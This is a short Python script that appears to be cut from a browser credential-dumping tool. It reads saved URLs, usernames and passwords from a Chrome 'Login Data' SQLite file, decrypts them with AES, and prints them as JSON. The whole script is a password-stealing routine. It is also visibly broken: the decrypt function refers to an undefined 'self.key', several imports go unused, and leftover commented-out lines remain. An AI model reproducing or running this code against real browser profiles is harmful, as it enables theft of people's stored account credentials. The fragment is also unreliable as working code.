import json
import os
import platform
import sqlite3
import string
import subprocess
from getpass import getuser
from importlib import import_module
from os import unlink
from shutil import copy

import secretstorage

def decrypt_func(enc_passwd):
        """ Mac Decryption Function """
        aes = import_module('Crypto.Cipher.AES')
        initialization_vector = b' ' * 16
        enc_passwd = enc_passwd[3:]
        cipher = aes.new(self.key, aes.MODE_CBC, IV=initialization_vector)
        decrypted = cipher.decrypt(enc_passwd)
        return decrypted.strip().decode('utf8')

conn = sqlite3.connect("Login Data.db")
cursor = conn.cursor()
cursor.execute("""
    SELECT action_url, username_value, password_value
    FROM logins; """)
data = {'data': []}
for result in cursor.fetchall():
    _passwd = decrypt_func(result[2])
    passwd = ''.join(i for i in _passwd if i in string.printable)
    if result[1] or passwd:
        _data = {}
        _data['url'] = result[0]
        _data['username'] = result[1]
        _data['password'] = passwd
        data['data'].append(_data)
conn.close()
# unlink("Login Data.db")

# if prettyprint:
print(json.dumps(data, indent=4))
# return data